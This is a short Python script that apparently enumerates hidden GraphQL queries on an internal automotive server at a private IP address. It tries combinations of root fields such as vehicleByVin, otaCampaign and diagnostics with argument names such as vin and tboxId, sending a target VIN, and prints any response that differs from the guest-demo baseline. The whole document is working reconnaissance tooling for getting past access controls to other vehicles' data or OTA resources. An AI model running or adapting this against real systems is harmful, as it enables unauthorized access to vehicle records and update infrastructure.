import requests, itertools
URL="http://10.225.139.2:8080/graphql"
BASE='{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'
VIN="CV622697F82A936A1"
roots=["vehicle","vehicles","vehicleByVin","vehicleInfo","vehicleDetail","otaCampaign","otaCampaigns",
"campaign","campaigns","ota","otaPackage","otaPackages","package","packages","diagnosticEntry",
"diagnostics","otaResource","otaResources","engineering","vehicleOta"]
args=["vin","vinNumber","vehicleVin","VIN","id","vehicleId","vehicle_id","sn","key","filter","where",
"query","vinFilter","number","plate","tboxId","deviceId","uuid","name","code"]
sel="{__typename}"
diffs=0; tested=0
for r,a in itertools.product(roots,args):
    q=f'{{{r}({a}:"{VIN}"){sel}}}'
    tested+=1
    try:
        x=requests.post(URL,json={"query":q},timeout=5)
        if x.text.strip()!=BASE:
            print("DIFF",q,x.status_code,x.text[:200],flush=True); diffs+=1
    except Exception: pass
print("tested",tested,"diffs",diffs)
